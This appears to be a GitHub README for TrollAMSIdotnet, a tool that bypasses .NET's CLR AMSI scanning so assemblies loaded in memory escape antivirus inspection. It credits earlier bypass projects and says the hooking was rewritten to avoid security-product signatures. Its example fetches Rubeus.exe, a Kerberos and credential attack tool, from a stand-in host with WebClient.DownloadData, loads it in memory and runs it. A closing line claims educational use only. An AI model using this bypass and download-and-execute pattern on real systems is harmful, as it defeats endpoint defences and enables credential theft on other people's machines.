# TrollAMSIdotnet
TrollAMSI only bypasses powershell's amsi and not the CLR amsi during Assembly.Load(). Was looking for a troll way to do this but seems like already done in the most epic way possible: https://github.com/G0ldenGunSec/SharpTransactedLoad. Read his blog for full details on his ingenious approach to bypassing amsi. G0ldenGunSec's implementation uses easyhook.dll for hooking which inturn requires cody fostura. Due to the proliferated use of both libraries in offensive security projects, they have been signaturized. Decided to re-write the hooking aspect but then realised there's a simple library already created for that: https://github.com/liulilittle/NetHook. Ended up just copy pasting code to create a single .cs file for convenience.


**Note:** Only .cs version released, you can just compile it to an assembly and load it (refer to trollAMSI) 
  
## Usage 
```
$asm = [TrollAMSIdotnet]::Load(<BYTE_ARRAY_DOWNLOAD>,<ASSEMBLY_NAME>) 
[string[]]$args = "<ARGUMENT_TO_ASSEMBLY>", "<ARGUMENT_TO_ASSEMBLY>"
[TrollAMSIdotnet]::Invoke($asm,$args)
```

## Example 
```
$asm = [TrollAMSIdotnet]::Load((New-Object System.Net.WebClient).DownloadData("https://troll.com/Rubeus.exe"),"Rubeus.exe") 
[string[]]$args = "triage", "/consoleoutfile:C:\FILE.txt"
[TrollAMSIdotnet]::Invoke($asm,$args)
```


## Disclaimer
Should only be used for educational purposes!
